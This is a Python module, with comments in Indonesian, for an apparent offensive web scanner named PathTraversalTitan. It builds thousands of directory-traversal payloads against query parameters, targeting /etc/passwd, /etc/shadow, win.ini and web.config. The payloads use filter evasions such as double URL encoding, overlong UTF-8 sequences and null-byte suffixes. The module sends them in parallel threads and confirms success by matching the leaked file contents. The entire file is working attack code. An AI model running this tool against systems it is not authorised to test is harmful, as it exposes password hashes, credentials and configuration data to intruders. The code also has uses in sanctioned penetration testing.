import requests
import urllib.parse
import copy
import re
import concurrent.futures
from colorama import Fore, Style

class PathTraversalTitan:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-TraversalTitan/14.0 (Heuristic-Engine)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # DATABASE SIGNATURE (REGEX) - UNTUK VERIFIKASI SUKSES
        self.signatures = {
            # Linux / Unix
            'etc_passwd': r"root:x:0:0:|root:\*:0:0:",
            'etc_shadow': r"root:\$6\$|root:\$1\$",
            'etc_issue': r"Ubuntu|Debian|CentOS|Fedora|Red Hat",
            'proc_version': r"Linux version",
            'ssh_config': r"Host \*|ForwardAgent",
            
            # Windows
            'win_ini': r"\[fonts\]|\[extensions\]|\[files\]",
            'boot_ini': r"\[boot loader\]",
            'system_ini': r"\[drivers\]",
            'iis_web_config': r"<configuration>",
            
            # Web Server Configs
            'htaccess': r"RewriteEngine|AuthType",
            'tomcat_users': r"<tomcat-users>"
        }

    def generate_mutation_payloads(self):
        """
        Menghasilkan ribuan variasi serangan Traversal
        menggunakan teknik Encoding & Evasion.
        """
        payloads = []
        
        # 1. BASE TARGET FILES
        targets_linux = [
            "etc/passwd", 
            "etc/shadow", 
            "etc/issue", 
            "proc/version", 
            "var/www/html/index.php"
        ]
        targets_windows = [
            "Windows/win.ini", 
            "Windows/system.ini", 
            "boot.ini",
            "inetpub/wwwroot/web.config"
        ]
        
        # 2. DEPTH LEVEL (Seberapa dalam kita mundur?)
        # Kita coba dari 1 sampai 12 level kedalaman
        depths = range(1, 13)

        # 3. TRAVERSAL PATTERNS (The Evasion Logic)
        patterns = [
            "../",              # Standard
            "..\\",             # Windows Standard
            "....//",           # Nested (Bypass strip filter)
            "....\\\\",         # Nested Windows
            "..././",           # Obfuscated
            "%2e%2e/",          # URL Encoded
            "%2e%2e%2f",        # Full URL Encoded
            "%252e%252e%252f",  # Double URL Encoded (Nginx/Apache bypass)
            "%c0%ae%c0%ae/",    # Unicode/UTF-8 Overflow
            "..%c0%af",         # Unicode illegal slash
            "..%255c",          # Double encoded backslash
            "/",                # Absolute path start (Root)
        ]

        # 4. GENERATOR LOOP
        for target in targets_linux + targets_windows:
            is_windows = target in targets_windows
            
            for depth in depths:
                for pattern in patterns:
                    # Logic Absolute Path (Tanpa depth)
                    if pattern == "/":
                        if not is_windows:
                            payload = f"/{target}"
                            payloads.append({
                                'pay': payload, 'os': 'Linux/Unix', 'type': 'Absolute Path', 
                                'sig': 'etc_passwd' if 'passwd' in target else 'proc_version'
                            })
                        continue

                    # Logic Relative Path
                    # Build string: ../../../etc/passwd
                    chain = pattern * depth
                    payload = f"{chain}{target}"
                    
                    # Tentukan signature yang diharapkan
                    expected_sig = 'unknown'
                    if 'passwd' in target: expected_sig = 'etc_passwd'
                    elif 'shadow' in target: expected_sig = 'etc_shadow'
                    elif 'win.ini' in target: expected_sig = 'win_ini'
                    elif 'boot.ini' in target: expected_sig = 'boot_ini'
                    
                    os_type = 'Windows' if is_windows else 'Linux'
                    
                    # Tambahkan variasi Null Byte (%00) untuk bypass extension check (.php)
                    payloads.append({'pay': payload, 'os': os_type, 'type': 'Standard Traversal', 'sig': expected_sig})
                    payloads.append({'pay': payload + "%00", 'os': os_type, 'type': 'Null Byte Bypass', 'sig': expected_sig})
                    payloads.append({'pay': payload + ".html", 'os': os_type, 'type': 'Extension Appending', 'sig': expected_sig})

        return payloads

    def test_single_payload(self, url, payload_data):
        """Fungsi worker untuk testing satu payload"""
        try:
            res = self.session.get(url, timeout=5)
            content = res.text
            
            # Cek Signature
            sig_key = payload_data['sig']
            if sig_key in self.signatures:
                regex = self.signatures[sig_key]
                if re.search(regex, content):
                    return True, len(content)
            
            # Heuristic Fallback: Cek jika content length berubah drastis atau status 200 unik
            # (Tidak diimplementasikan agar tidak false positive, kita fokus signature match)
            
        except:
            pass
        return False, 0

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Path Traversal Titan (Deep Inspection){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters detected. Traversal needs input points (e.g. ?file=...).")
            return

        print(f"{Fore.YELLOW}[+] Generating Mutation Engine Payloads...{Style.RESET_ALL}")
        # Kita batasi payload agar tidak memakan memori berlebih jika terlalu banyak variasi
        # Tapi karena diminta mendalam, kita generate full list.
        all_payloads = self.generate_mutation_payloads()
        print(f"   └── Generated {len(all_payloads)} unique attack vectors per parameter.")
        
        print(f"{Fore.YELLOW}[+] Starting Multi-Threaded Scan...{Style.RESET_ALL}")

        total_vulns = 0

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            
            # Kita gunakan ThreadPoolExecutor untuk kecepatan tinggi
            # Karena payload bisa ribuan
            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                # Siapkan futures dictionary
                future_to_payload = {}
                
                for p_data in all_payloads:
                    # Construct URL
                    new_params = copy.deepcopy(self.params)
                    new_params[param] = [p_data['pay']]
                    
                    # Handle encoding quirks
                    query = urllib.parse.urlencode(new_params, doseq=True)
                    # Requests library kadang men-double encode %, kita perlu raw string untuk serangan tertentu
                    # Tapi untuk simplisitas di sini kita pakai standar requests
                    
                    attack_url = f"{self.base_url}?{query}"
                    
                    # Submit task
                    future = executor.submit(self.test_single_payload, attack_url, p_data)
                    future_to_payload[future] = p_data

                # Process results as they complete
                found_for_param = False
                for future in concurrent.futures.as_completed(future_to_payload):
                    if found_for_param: 
                        break # Stop parameter ini jika sudah ketemu vuln (hemat waktu)
                        
                    p_data = future_to_payload[future]
                    try:
                        is_vuln, size = future.result()
                        if is_vuln:
                            print(f"   {Fore.RED}[CRITICAL] TRAVERSAL DETECTED!{Style.RESET_ALL}")
                            print(f"   ├── Payload   : {Fore.YELLOW}{p_data['pay']}{Style.RESET_ALL}")
                            print(f"   ├── OS Family : {p_data['os']}")
                            print(f"   ├── Technique : {p_data['type']}")
                            print(f"   └── Signature : Matched pattern '{p_data['sig']}'")
                            
                            total_vulns += 1
                            found_for_param = True
                            
                            # Batalkan semua task sisa untuk parameter ini
                            executor.shutdown(wait=False, cancel_futures=True)
                            
                    except Exception:
                        pass

        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: {total_vulns} High-Severity Traversal Vulnerabilities.{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Impact: Arbitrary File Read, Sensitive Data Exposure.")
        else:
            print(f"{Fore.GREEN}[OK] Target appears secured against Path Traversal.{Style.RESET_ALL}")

def run_traversal_scan(url):
    engine = PathTraversalTitan(url)
    engine.run_scan()